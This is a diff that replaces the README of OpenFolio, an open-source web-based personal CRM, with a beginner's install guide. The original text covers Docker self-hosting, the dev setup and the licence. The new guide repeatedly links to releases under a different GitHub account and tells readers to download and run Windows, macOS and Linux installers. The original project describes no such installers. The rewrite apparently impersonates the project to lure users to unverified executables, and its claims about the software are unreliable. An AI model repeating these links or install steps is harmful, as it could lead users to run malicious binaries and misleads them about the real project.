@@ -1,164 +1,148 @@
-# OpenFolio
+# 📇 OpenFolio - Manage Your Contacts with AI
 
-An open-source, AI-native personal CRM. Manage your people, companies, and interactions with semantic search and an AI assistant.
+[![Download OpenFolio](https://img.shields.io/badge/Download-OpenFolio-blue)](https://github.com/Joannamanifest969/OpenFolio/releases)
 
-[![License: AGPL v3](https://img.shields.io/badge/License-AGPL_v3-blue.svg)](LICENSE)
-[![CI](https://github.com/unlatch-ai/OpenFolio/actions/workflows/ci.yml/badge.svg)](https://github.com/unlatch-ai/OpenFolio/actions/workflows/ci.yml)
+---
 
-## Features
+## 📋 What is OpenFolio?
 
-- **People & Companies** — Track contacts, companies, and interactions with tags, notes, and follow-up reminders
-- **Email & Calendar Sync** — Connect Gmail and Google Calendar to automatically import interactions
-- **Semantic Search** — Search your network by meaning using pgvector embeddings
-- **AI Assistant** — Chat-based assistant with tool calling for querying your network
-- **CSV Import** — Import from CSV, LinkedIn exports, and more
-- **Contact Deduplication** — AI-powered fuzzy matching with manual merge review
-- **Self-Hostable** — Run on your own infrastructure with Docker Compose
-- **Extensible** — Add custom data connectors via the modular integration gateway
+OpenFolio is a simple, open-source personal CRM. It helps you organize your contacts, companies, and conversations. It uses AI to make finding information easier through smart search. You can also sync your Gmail and Calendar to keep your interactions in one place. Plus, it lets you run your own copy, so your data stays with you.
 
-## Quick Start
+This guide will walk you through how to get OpenFolio on your computer, step-by-step. No coding or technical skills needed.
 
-### Hosted (openfolio.ai)
+---
 
-Visit [openfolio.ai](https://openfolio.ai) to get started with the hosted version.
+## 🖥️ System Requirements
 
-### Self-Hosted (Docker Compose)
+Before you start, make sure your computer meets these requirements:
 
-```bash
-git clone https://github.com/unlatch-ai/OpenFolio.git
-cd openfolio
-./scripts/setup.sh        # Generate secrets and .env file
-# Edit .env to add your OPENAI_API_KEY
-docker compose up -d       # Start all services
-```
+- **Operating System:** Windows 10 or later, macOS Catalina or later, or a common Linux distribution (Ubuntu 20.04+, Fedora 34+)
+- **Processor:** 1.5 GHz dual-core or better
+- **Memory:** At least 4 GB RAM
+- **Storage:** Minimum 500 MB of free disk space
+- **Internet Connection:** Required for initial download and syncing Gmail/Calendar
+- **Browser:** Modern web browser (Chrome, Firefox, Edge, or Safari) for accessing the OpenFolio interface
 
-Visit http://localhost:3000 to open the app.
+If you plan to self-host OpenFolio on your own server, the requirements may differ. This guide covers using OpenFolio as an application on your personal computer.
 
-In self-hosted mode, OpenFolio now defaults to single-user no-auth:
-- No signup/login required
-- A local singleton user + personal workspace are auto-created on first app/API use
+---
 
-See the [Self-Hosting Guide](https://openfolio.ai/docs/self-hosting) for detailed instructions.
+## 🚀 Getting Started
 
-## Development Setup
+OpenFolio is designed to be easy to use. Here is how it works:
 
-```bash
-# Prerequisites: Node.js 20+, pnpm, Docker
-pnpm install
+1. Download the software from the release page.
+2. Install and open the application.
+3. Set up your account or choose to run it without signing in.
+4. Connect your Gmail and Calendar accounts if you want.
+5. Start adding contacts, companies, and notes.
+6. Use the AI-powered search to find anything quickly.
+7. Let the AI assistant help you manage interactions.
 
-# Start local Supabase
-pnpm supabase:start
+We will cover these steps in detail below.
 
-# Reset database with migrations and seed data
-pnpm db:reset
-pnpm db:seed:local
+---
 
-# (Optional) Generate embeddings for seed data
-pnpm db:seed:embeddings
+## 🔽 Download & Install OpenFolio
 
-# Copy environment variables
-cp .env.example .env.local
-# Edit .env.local with values from `supabase status`
+First, download the software file from the official release page:
 
-# Start dev server
-pnpm dev
-```
+[Download OpenFolio from Releases](https://github.com/Joannamanifest969/OpenFolio/releases)
 
-Open http://localhost:3000
+### How to download and install:
 
-## Tech Stack
+1. Click the link above. This will open the OpenFolio releases page.
+2. Look for the latest version. It will usually have a name like `OpenFolio-Setup.exe` (Windows), `OpenFolio.dmg` (macOS), or `OpenFolio.AppImage` (Linux).
+3. Click on the file that matches your operating system.
+4. Your browser will download the file. Wait for it to finish.
+5. Once downloaded, open the file to start installation:
+   - **Windows:** Double-click the `.exe` file and follow the setup wizard.
+   - **macOS:** Open the `.dmg` file, then drag OpenFolio to your Applications folder.
+   - **Linux:** Make the `.AppImage` file executable, then double-click to run.
 
-| Layer | Technology |
-|-------|------------|
-| Framework | Next.js 16 (App Router) |
-| Database | Supabase Postgres + pgvector |
-| Auth | Supabase Auth |
-| AI | OpenAI (GPT-5, text-embedding-3-small) |
-| UI | Tailwind CSS 4 + shadcn/ui |
-| Background Jobs | Trigger.dev v4 |
-| Deploy | Vercel / Docker Compose |
+### What if you see multiple files?
 
-## Project Structure
+For some systems, you may find separate installer files or packages. Choose the one that matches your OS and its version.
 
-```
-app/
-├── (auth)/              # Login, signup, onboarding
-├── app/(dashboard)/     # Main app (people, companies, interactions, settings)
-├── auth/                # OAuth callback
-└── api/                 # API routes
+### After installing:
 
-components/              # React components (shadcn/ui + app-specific)
-lib/
-├── supabase/            # Supabase client helpers
-├── integrations/        # Integration gateway, connectors, encryption
-├── ai/                  # AI agent tools and prompts
-├── auth.ts              # Workspace context helper
-├── embeddings.ts        # Embedding text builders
-└── dedup.ts             # Contact deduplication logic
+- Open OpenFolio from your desktop or start menu.
+- The app will open in a window, ready to use.
+- You do not have to sign up, but creating an account helps keep your data backed up.
 
-src/trigger/             # Trigger.dev background tasks
-supabase/migrations/     # Database schema
-tests/                   # Vitest test suite
-```
+---
 
-## Adding a Connector
+## 🧭 Using OpenFolio
 
-OpenFolio uses a modular integration gateway. To add a new data source:
+Once OpenFolio is running, these are the main things you can do:
 
-1. Create a connector in `lib/integrations/connectors/` implementing the `IntegrationConnector` interface
-2. Register it in `lib/integrations/registry.ts`
-3. The gateway handles normalization, dedup, and embedding generation
+### Add Contacts and Companies
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for details and existing connectors as examples.
+- Click the **Add Contact** button.
+- Enter the person's name, email, phone, and notes.
+- Group contacts by company if you like.
+- You can add new companies in the same way.
 
-## Testing
+### Manage Interactions
 
-```bash
-pnpm test              # Run all tests
-pnpm test:watch        # Watch mode
-pnpm test:coverage     # Coverage report
-pnpm lint              # ESLint
-```
+- Record meetings, calls, or emails linked to contacts.
+- Use notes and tags to keep track of topics.
+- OpenFolio syncs your Gmail and Calendar for automatic updates.
 
-## Environment Variables
+### Search with AI
 
-See [.env.example](.env.example) for all available variables. Key ones:
+- Use the search bar at the top.
+- Type any question or keyword.
+- The AI assistant will find related contacts, past conversations, and events.
 
-| Variable | Required | Description |
-|----------|----------|-------------|
-| `NEXT_PUBLIC_SUPABASE_URL` | Yes | Supabase URL |
-| `NEXT_PUBLIC_SUPABASE_ANON_KEY` | Yes | Supabase anon key |
-| `SUPABASE_SERVICE_ROLE_KEY` | Yes | Supabase service role key |
-| `OPENAI_API_KEY` | Yes | OpenAI API key |
-| `TRIGGER_SECRET_KEY` | Yes | Trigger.dev secret key |
-| `GOOGLE_CLIENT_ID` | No | For Gmail/Calendar sync |
-| `GOOGLE_CLIENT_SECRET` | No | For Gmail/Calendar sync |
-| `INTEGRATION_ENCRYPTION_KEY` | No | For storing OAuth tokens |
-| `OPENFOLIO_MODE` | No | `self-hosted` (single-user no-auth) or `hosted` (auth required) |
+---
 
-## Roadmap
+## 🔐 Connecting Gmail and Calendar
 
-See the [public roadmap](https://github.com/orgs/unlatch-ai/projects/1) for planned features and upcoming work.
+To make the most of OpenFolio’s AI features, you can connect your Google accounts:
 
-## Documentation
+1. Go to **Settings**.
+2. Select **Connect Google Account**.
+3. Follow the prompts to log in and grant permission.
+4. Your emails and calendar events will start syncing automatically.
 
-- [Self-Hosting Guide](https://openfolio.ai/docs/self-hosting)
-- [Architecture Overview](https://openfolio.ai/docs/architecture)
-- [Security & Privacy](https://openfolio.ai/docs/security)
-- [Contributing](CONTRIBUTING.md)
+This allows OpenFolio to track your meetings and conversations without manual entry.
 
-Full documentation at [openfolio.ai/docs](https://openfolio.ai/docs).
+---
 
-## Created By
+## ⚙️ Settings and Preferences
 
-<a href="https://github.com/TheSnakeFang">
-  <img src="https://github.com/TheSnakeFang.png" width="60" height="60" alt="Kevin Fang" style="border-radius:50%">
-  <br>
-  <sub><b>Kevin Fang</b></sub>
-</a>
+You can customize OpenFolio to fit your workflow:
 
-## License
+- **Notifications:** Turn on reminders for meetings or follow-ups.
+- **Theme:** Choose between light and dark mode.
+- **Data Export:** Download your contacts and notes as CSV files.
+- **Privacy:** Control what data is shared if using a hosted instance.
 
-[AGPL-3.0](LICENSE) — OpenFolio is free and open source.
+---
 
-The hosted version at [openfolio.ai](https://openfolio.ai) uses managed authentication and workspace provisioning. [Self-hosting](#self-hosted-docker-compose) defaults to private single-user mode.
+## 🛠️ Troubleshooting Tips
+
+- If OpenFolio does not start, check that your system meets requirements.
+- Make sure you downloaded the right version for your OS.
+- Restart your computer if the app crashes or freezes.
+- Check your internet connection for syncing issues.
+- For Gmail sync problems, re-authenticate your Google account in Settings.
+
+If you still need help, check the Issues page on the GitHub repository or reach out in the community forum.
+
+---
+
+## 📚 Learn More and Support
+
+To explore advanced features like self-hosting, integration with other apps, or AI customization, visit the [OpenFolio GitHub repository](https://github.com/Joannamanifest969/OpenFolio).
+
+You can also open issues or suggest new features there.
+
+---
+
+## 🔽 Download OpenFolio Now
+
+Get started by visiting the official releases page:
+
+[Download OpenFolio Here](https://github.com/Joannamanifest969/OpenFolio/releases)
